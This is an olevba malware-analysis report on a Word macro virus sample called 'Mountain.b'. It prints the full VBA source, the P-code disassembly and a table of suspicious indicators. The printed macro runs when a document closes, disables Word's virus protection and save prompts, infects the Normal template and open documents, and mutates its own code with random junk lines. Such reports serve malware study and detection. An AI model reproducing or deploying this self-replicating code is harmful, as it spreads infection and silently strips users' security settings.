olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hill.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hill.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Модуль1.bas 
in file: Virus.MSWord.Hill.b - OLE stream: 'Macros/VBA/Модуль1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Mountain
Private Sub Document_Close()
Dim MountainJ, MountainMT
   On Error Resume Next
   'Macro.Word97.Mountain.b by Duke/SMF
   Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
   Options.VirusProtection = False
   Options.ConfirmConversions = False
   Options.SaveNormalPrompt = False
   Randomize
   MountainJ = 1
   MountainMT = Mid(AD.Lines(1, 1), 2)
   If NT.Lines(1, 1) <> "'Mountain" Then
      For i = 1 To AD.CountOfLines
         NT.InsertLines MountainJ, MountainRP(AD.Lines(i, 1), MountainMT, MountainGN(26, 65))
         MountainJ = MountainJ + 1
         MountainEX = Mid(AD.Lines(i, 1), 1, 1)
         If MountainEX = Asc(" ") Then MountainNT
      Next
   End If
   MountainJ = 1
   MountainMT = Mid(NT.Lines(1, 1), 2)
   If AD.Lines(1, 1) <> "'Mountain" Then
      For i = 1 To NT.CountOfLines
         AD.InsertLines MountainJ, MountainRP(NT.Lines(i, 1), MountainMT, MountainGN(26, 65))
         MountainJ = MountainJ + 1
         MountainEX = Mid(NT.Lines(i, 1), 1, 1)
         If MountainEX = Asc(" ") Then MountainAD
      Next
   End If
End Sub
Function MountainNT()
   R = Rnd
   If R < 1 And R > 0.08 Then
      NT.InsertLines MountainJ, " " + MountainGN(26, 65) + " = " + Chr(34) + MountainGN(128, 48) + Chr(34)
   End If
   If R < 0.08 And R > 0.05 Then
      NT.InsertLines MountainJ, " '" + MountainGN(128, 48)
   End If
   If R < 0.05 And R > 0.03 Then
      NT.InsertLines MountainJ, "  "
   End If
   If R > 0.03 Then MountainJ = MountainJ + 1
End Function
Function MountainAD()
   R = Rnd
   If R < 1 And R > 0.08 Then
      AD.InsertLines MountainJ, " " + MountainGN(26, 65) + " = " + Chr(34) + MountainGN(128, 48) + Chr(34)
   End If
   If R < 0.08 And R > 0.05 Then
      AD.InsertLines MountainJ, " '" + MountainGN(128, 48)
   End If
   If R < 0.05 And R > 0.03 Then
      AD.InsertLines MountainJ, "  "
   End If
   If R > 0.03 Then MountainJ = MountainJ + 1
End Function
Function MountainGN(x, y)
   MountainGN = ""
   For i = 1 To Int(20 * Rnd + 1)
      MountainGN = MountainGN + Chr(Int(x * Rnd + y))
   Next
End Function
Function MountainRP(s, a, b)
   i = 1
   Do While i < Len(s)
      If Mid(s, i, Len(a)) = a Then
         s = Mid(s, 1, i - 1) + b + Mid(s, i + 1)
      End If
   Loop
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Hill.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/Модуль1 - 10950 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0008 "Mountain"
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	Dim 
' 	VarDefn MountainJ
' 	VarDefn MountainMT
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	QuoteRem 0x0003 0x0023 "Macro.Word97.Mountain.b by Duke/SMF"
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #6:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	ArgsCall Read 0x0000 
' Line #11:
' 	LitDI2 0x0001 
' 	St MountainJ 
' Line #12:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St MountainMT 
' Line #13:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0009 "'Mountain"
' 	Ne 
' 	IfBlock 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	For 
' Line #15:
' 	Ld MountainJ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	Ld MountainMT 
' 	LitDI2 0x001A 
' 	LitDI2 0x0041 
' 	ArgsLd MountainGN 0x0002 
' 	ArgsLd MountainRP 0x0003 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #16:
' 	Ld MountainJ 
' 	LitDI2 0x0001 
' 	Add 
' 	St MountainJ 
' Line #17:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St MountainEX 
' Line #18:
' 	Ld MountainEX 
' 	LitStr 0x0001 " "
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall MountainNT 0x0000 
' 	EndIf 
' Line #19:
' 	StartForVariable 
' 	Next 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	LitDI2 0x0001 
' 	St MountainJ 
' Line #22:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St MountainMT 
' Line #23:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0009 "'Mountain"
' 	Ne 
' 	IfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	For 
' Line #25:
' 	Ld MountainJ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Ld MountainMT 
' 	LitDI2 0x001A 
' 	LitDI2 0x0041 
' 	ArgsLd MountainGN 0x0002 
' 	ArgsLd MountainRP 0x0003 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #26:
' 	Ld MountainJ 
' 	LitDI2 0x0001 
' 	Add 
' 	St MountainJ 
' Line #27:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St MountainEX 
' Line #28:
' 	Ld MountainEX 
' 	LitStr 0x0001 " "
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall MountainAD 0x0000 
' 	EndIf 
' Line #29:
' 	StartForVariable 
' 	Next 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Function MountainNT())
' Line #33:
' 	Ld Rnd 
' 	St R 
' Line #34:
' 	Ld R 
' 	LitDI2 0x0001 
' 	Lt 
' 	Ld R 
' 	LitR8 0x147B 0x47AE 0x7AE1 0x3FB4 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #35:
' 	Ld MountainJ 
' 	LitStr 0x0001 " "
' 	LitDI2 0x001A 
' 	LitDI2 0x0041 
' 	ArgsLd MountainGN 0x0002 
' 	Add 
' 	LitStr 0x0003 " = "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0080 
' 	LitDI2 0x0030 
' 	ArgsLd MountainGN 0x0002 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	Ld R 
' 	LitR8 0x147B 0x47AE 0x7AE1 0x3FB4 
' 	Lt 
' 	Ld R 
' 	LitR8 0x999A 0x9999 0x9999 0x3FA9 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #38:
' 	Ld MountainJ 
' 	LitStr 0x0002 " '"
' 	LitDI2 0x0080 
' 	LitDI2 0x0030 
' 	ArgsLd MountainGN 0x0002 
' 	Add 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld R 
' 	LitR8 0x999A 0x9999 0x9999 0x3FA9 
' 	Lt 
' 	Ld R 
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3F9E 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #41:
' 	Ld MountainJ 
' 	LitStr 0x0002 "  "
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	Ld R 
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3F9E 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld MountainJ 
' 	LitDI2 0x0001 
' 	Add 
' 	St MountainJ 
' 	EndIf 
' Line #44:
' 	EndFunc 
' Line #45:
' 	FuncDefn (Function MountainAD())
' Line #46:
' 	Ld Rnd 
' 	St R 
' Line #47:
' 	Ld R 
' 	LitDI2 0x0001 
' 	Lt 
' 	Ld R 
' 	LitR8 0x147B 0x47AE 0x7AE1 0x3FB4 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #48:
' 	Ld MountainJ 
' 	LitStr 0x0001 " "
' 	LitDI2 0x001A 
' 	LitDI2 0x0041 
' 	ArgsLd MountainGN 0x0002 
' 	Add 
' 	LitStr 0x0003 " = "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0080 
' 	LitDI2 0x0030 
' 	ArgsLd MountainGN 0x0002 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	Ld R 
' 	LitR8 0x147B 0x47AE 0x7AE1 0x3FB4 
' 	Lt 
' 	Ld R 
' 	LitR8 0x999A 0x9999 0x9999 0x3FA9 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #51:
' 	Ld MountainJ 
' 	LitStr 0x0002 " '"
' 	LitDI2 0x0080 
' 	LitDI2 0x0030 
' 	ArgsLd MountainGN 0x0002 
' 	Add 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Ld R 
' 	LitR8 0x999A 0x9999 0x9999 0x3FA9 
' 	Lt 
' 	Ld R 
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3F9E 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #54:
' 	Ld MountainJ 
' 	LitStr 0x0002 "  "
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	Ld R 
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3F9E 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld MountainJ 
' 	LitDI2 0x0001 
' 	Add 
' 	St MountainJ 
' 	EndIf 
' Line #57:
' 	EndFunc 
' Line #58:
' 	FuncDefn (Function MountainGN(x, y))
' Line #59:
' 	LitStr 0x0000 ""
' 	St MountainGN 
' Line #60:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	For 
' Line #61:
' 	Ld MountainGN 
' 	Ld x 
' 	Ld Rnd 
' 	Mul 
' 	Ld y 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St MountainGN 
' Line #62:
' 	StartForVariable 
' 	Next 
' Line #63:
' 	EndFunc 
' Line #64:
' 	FuncDefn (Function MountainRP(s, a, B))
' Line #65:
' 	LitDI2 0x0001 
' 	St i 
' Line #66:
' 	Ld i 
' 	Ld s 
' 	FnLen 
' 	Lt 
' 	DoWhile 
' Line #67:
' 	Ld s 
' 	Ld i 
' 	Ld a 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Ld a 
' 	Eq 
' 	IfBlock 
' Line #68:
' 	Ld s 
' 	LitDI2 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Ld B 
' 	Add 
' 	Ld s 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Mid$ 0x0002 
' 	Add 
' 	St s 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	Loop 
' Line #71:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

